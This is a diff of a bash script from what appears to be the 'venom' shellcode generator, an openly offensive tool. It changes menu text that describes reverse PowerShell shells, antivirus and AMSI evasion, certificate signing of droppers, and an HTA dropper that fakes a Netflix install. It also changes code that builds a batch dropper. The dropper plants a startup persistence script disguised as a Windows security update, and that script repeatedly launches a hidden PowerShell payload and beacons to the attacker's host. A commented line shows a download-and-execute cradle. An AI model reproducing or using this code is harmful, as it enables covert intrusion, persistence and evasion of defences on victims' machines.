@@ -12410,9 +12410,9 @@ cat << !
     AGENT Nº   : 1
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse TCP Powershell Shell
-    OBFUSCATION: If activated, creates a VBS dropper insted of PS1
+    OBFUSCATION: If active (ON) creates a VBS dropper insted of PS1
                  This function its used to hidde better the execution
-                 of venom dropper on target machine (silent execution)
+                 of venom dropper on target machine (stealth mode)
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -12426,9 +12426,9 @@ cat << !
     AGENT Nº   : 2
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse OpenSSL Powershell Shell
-    OBFUSCATION: If activated, 'persistence' creates a VBS insted of BAT
-                 This function its used to hidde better the execution of
-                 venom persistence scripts on target machine (silent exec)
+    OBFUSCATION: If active (ON) 'persistence' module creates a VBS insted of BAT startup script.
+                 The persistence.vbs script will hidde better is execution. While persistence.bat
+                 its written to beacon home from 8 to 8 sec until a valid connection its found.
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -12442,9 +12442,9 @@ cat << !
     AGENT Nº   : 3
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse Powershell Shell (hex obfuscation)
-    OBFUSCATION: If activated, 'persistence' creates a VBS insted of BAT
-                 This function its used to hidde better the execution of
-                 venom persistence scripts on target machine (silent exec)
+    OBFUSCATION: If active (ON) 'persistence' module creates a VBS insted of BAT startup script.
+                 The persistence.vbs script will hidde better is execution. While persistence.bat
+                 its written to beacon home from 8 to 8 sec until a valid connection its found.
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -12459,9 +12459,6 @@ cat << !
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: meterpeter Reverse PS Shell (ascii|bxor)
     OBFUSCATION: This module does not support easter eggs (directly!)
-                 But.. meterpeter main script can be edit to activate
-                 the 'obfuscation=on' function that in windows attacker
-                 machine uses PS2EXE.ps1 to compile the PS1 dropper to EXE.
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -12475,9 +12472,9 @@ cat << !
     AGENT Nº   : 5
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse TCP Shell (PDF Trojan)
-    OBFUSCATION: If activated, dropper.exe its signed for AV evasion.
-                 Using @paranoidninja - CarbonCopy script that signs venom
-                 dropper with one SSL certificate (random domain generation)
+    OBFUSCATION: If active (ON) dropper.exe its signed for AV evasion using
+                 @paranoidninja - CarbonCopy script that signs venom dropper
+                 and Client with one SSL certificate(s) (random generation)
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -12513,11 +12510,9 @@ cat << !
     AGENT Nº   : 7
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse TCP Powershell Shell (OpenSSL - FileLess)
-    OBFUSCATION: If activated, dropper.hta html file will be created
-                 insted of the obfuscated Batch dropper.bat (default).
-                 The dropper.hta will fake the install of Netflix from
-                 play.google.com/store before executing our Agent in RAM.
-                 (The hta dropper module allow us to input a diferent URL).
+    OBFUSCATION: If active (ON) dropper.hta script will be created insted of the obfuscated
+                 Batch dropper.bat (default). The dropper.hta will fake the install of Netflix
+                 from play.google.com/store before executing our Agent in RAM (FileLess).
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -12779,7 +12774,7 @@ echo "---"
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
 if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.vbs on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 else
    persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 fi
@@ -12816,9 +12811,9 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo netstat -ano^|findstr \"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
@@ -13030,9 +13025,9 @@ echo "---"
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
 if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\n$Drop.$ext.bat will create KB4524147_$random_name.update.vbs on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 else
-   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\n$Drop.$ext.bat will create KB4524147_$random_name.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$random_name.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 fi
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
@@ -13067,9 +13062,9 @@ else
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo netstat -ano^|findstr \"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
